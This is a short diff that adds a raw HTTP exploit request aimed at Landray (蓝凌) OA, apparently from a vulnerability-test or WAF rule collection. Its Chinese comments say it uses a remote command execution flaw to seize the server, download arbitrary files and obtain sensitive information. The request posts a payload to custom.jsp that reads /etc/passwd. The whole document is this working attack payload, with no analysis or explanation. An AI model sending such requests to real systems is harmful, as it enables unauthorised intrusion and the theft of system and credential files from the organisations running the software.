@@ -1,0 +1,11 @@
+# 利用【蓝凌oa远程命令执行漏洞获取服务器控制权】-80000015
+# 利用蓝凌oa远程命令执行漏洞获取服务器控制权、下载任意文件漏洞、利用漏洞获取敏感信息等。
+POST /sys/ui/extend/varkind/custom.jsp?acid=80000015&bid=hd_tag_m8mv247r HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv247r
+RM-PRO-Token: 9fc275c4557d53ae4b81c05aa0e9814e
+RM-PRO-Time: 1742808367955
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+var={"body":{"file":"file:///etc/passwd"}}
